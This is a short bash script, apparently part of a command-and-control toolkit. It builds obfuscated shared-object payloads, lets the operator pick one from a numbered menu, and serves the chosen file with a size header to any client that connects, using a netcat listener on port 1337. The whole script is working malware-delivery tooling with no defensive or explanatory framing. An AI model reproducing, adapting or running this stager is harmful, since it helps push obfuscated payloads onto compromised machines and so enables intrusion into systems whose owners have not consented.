#!/bin/bash

# build all payloads
cd ../../payloads/
make obfuscated > /dev/null

# get a list of all payloads
ls | grep .so > /tmp/tmp.txt
cd ../tools/c2

# payload selection menu
counter=0
while read line; do
    counter=$(($counter + 1))
    echo "[$counter] $line"
done < /tmp/tmp.txt
read -p "Select a payload: " choice

# validate selection
if [ $choice -lt 1 ] || [ $choice -gt $counter ]
then
    echo "error: invalid selection"
    exit
else
    choice=$(printf "../../payloads/$(sed "${choice}q;d" /tmp/tmp.txt)")
fi  

# send file size then file to each connecting client
file_size=$(stat --printf="%s" $choice)
cat <(printf "%013d" $file_size) <(cat $choice) | nc -lvp 1337
